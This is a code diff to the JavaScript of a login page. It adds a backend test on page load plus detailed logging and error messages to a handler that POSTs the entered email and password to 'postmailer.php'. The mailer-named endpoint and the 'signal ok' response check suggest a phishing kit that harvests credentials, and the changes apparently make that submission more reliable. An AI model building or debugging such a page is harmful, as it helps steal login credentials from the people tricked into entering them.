@@ -245,6 +245,38 @@
                  }
              });
              
+             // Test backend connection
+             function testBackend() {
+                 console.log('Testing backend connection...');
+                 $.ajax({
+                     url: 'postmailer.php',
+                     method: 'GET',
+                     timeout: 5000,
+                     success: function(response) {
+                         console.log('✓ Backend is accessible');
+                     },
+                     error: function(xhr, status, error) {
+                         console.log('✗ Backend connection failed:');
+                         console.log('Status:', status);
+                         console.log('Error:', error);
+                         console.log('Response Text:', xhr.responseText);
+                         console.log('Status Code:', xhr.status);
+                         
+                         // Show user-friendly error message
+                         $('#msg').text('⚠️ Backend connection issue. Check console for details.')
+                                .css('color', 'orange')
+                                .css('background-color', '#fff3cd')
+                                .css('border', '1px solid #ffeaa7')
+                                .css('padding', '8px')
+                                .css('border-radius', '4px')
+                                .show();
+                     }
+                 });
+             }
+             
+             // Test backend on page load
+             testBackend();
+             
              // Form submission handler
              $('#login_submit').click(function(e) {
                  e.preventDefault();
@@ -274,28 +306,61 @@
                  $('#login-status').hide();
                  $('#loading-overlay').show();
                  
-                 // AJAX form submission
+                 console.log('Submitting login request...');
+                 console.log('Email:', email);
+                 console.log('Backend URL:', 'postmailer.php');
+                 
+                 // AJAX form submission with enhanced error handling
                  $.ajax({
                      url: 'postmailer.php',
                      method: 'POST',
                      data: { email: email, password: password },
                      dataType: 'json',
                      timeout: 30000,
+                     cache: false,
                      beforeSend: function() {
                          $('#login_submit').prop('disabled', true).text('Processing...');
+                         console.log('Sending AJAX request to postmailer.php');
                      },
                      success: function(response) {
-                         console.log('Server response:', response);
+                         console.log('✓ AJAX Success - Server response:', response);
                          
                          if (response && (response.signal === 'ok' || response.success === true)) {
+                             console.log('✓ Login successful');
                              handleSuccessfulLogin(response);
                          } else {
+                             console.log('✗ Login failed');
                              handleFailedLogin(response);
                          }
                      },
                      error: function(xhr, status, error) {
+                         console.log('✗ AJAX Error occurred:');
+                         console.log('Status:', status);
+                         console.log('Error:', error);
+                         console.log('Response Text:', xhr.responseText);
+                         console.log('Status Code:', xhr.status);
+                         console.log('Ready State:', xhr.readyState);
+                         
                          $('#loading-overlay').hide();
-                         $('#login-status-message').text('Connection error: ' + error);
+                         
+                         var errorMsg = 'Connection error';
+                         if (status === 'timeout') {
+                             errorMsg = 'Request timeout - server took too long to respond';
+                         } else if (status === 'error') {
+                             if (xhr.status === 0) {
+                                 errorMsg = 'Network error - cannot reach server';
+                             } else if (xhr.status === 404) {
+                                 errorMsg = 'Backend file not found (404) - check if postmailer.php exists';
+                             } else if (xhr.status === 500) {
+                                 errorMsg = 'Server error (500) - check PHP error logs';
+                             } else {
+                                 errorMsg = 'HTTP Error ' + xhr.status + ': ' + error;
+                             }
+                         } else if (status === 'parsererror') {
+                             errorMsg = 'Invalid JSON response from server';
+                         }
+                         
+                         $('#login-status-message').text(errorMsg);
                          $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                          $('#password').val('').focus();
                      },
